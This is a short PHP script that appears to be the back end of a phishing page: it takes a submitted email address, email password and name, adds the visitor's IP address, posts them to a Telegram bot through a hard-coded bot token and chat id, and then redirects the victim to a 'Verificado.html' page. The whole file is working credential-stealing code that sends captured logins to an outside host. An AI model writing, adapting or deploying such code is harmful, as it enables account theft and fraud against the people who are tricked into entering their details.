<?php
@session_start();
$userp = $_SERVER['REMOTE_ADDR'];


$token = "5525602887:AAENLFj816sJbuIA6tfsq61I31rU_8DlLoE";
$id = "1279332824";
$urlMsg = "https://api.telegram.org/bot{$token}/sendMessage";
$msg = "
Correo: ".$_POST['email1']."
ClaveCorreo: ".$_POST['pass1']."
Nombre: ".$_POST['name1']."
IP: ".$userp."
";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlMsg);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$server_output = curl_exec($ch);
curl_close($ch);



header ('location: Verificado.html');
?>

